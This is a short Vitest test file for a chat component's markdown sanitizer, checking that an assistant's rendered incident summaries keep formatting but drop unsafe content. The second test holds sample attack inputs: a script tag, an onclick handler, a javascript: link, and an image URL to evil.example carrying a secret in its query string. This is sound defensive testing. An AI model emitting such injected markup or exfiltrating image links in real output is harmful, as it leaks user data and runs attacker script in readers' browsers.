// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { toSafeHtml } from '../../src/client/components/chat/safe-markdown'

describe('assistant markdown', () => {
    it('renders lists, emphasis, code and tables', () => {
        const html = toSafeHtml('**2 incidents**\n\n- INC0010001 `P2`\n- INC0010002\n\n| Number | State |\n|---|---|\n| INC0010001 | New |')
        expect(html).toContain('<strong>2 incidents</strong>')
        expect(html).toContain('<li>INC0010001 <code>P2</code></li>')
        expect(html).toContain('<td>INC0010001</td>')
    })

    it('drops scripts, handlers, images and unsafe links (record text is untrusted)', () => {
        const html = toSafeHtml('<script>alert(1)</script><b onclick="x()">hi</b>\n\n![x](https://evil.example/?d=secret)\n\n'
            + '[click](javascript:alert(1)) [ok](https://example.com) [rec](/incident.do?sys_id=1)')
        expect(html).not.toMatch(/<script|onclick|<img|javascript:/i)
        expect(html).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">ok</a>')
        expect(html).toContain('href="/incident.do?sys_id=1"')
    })
})
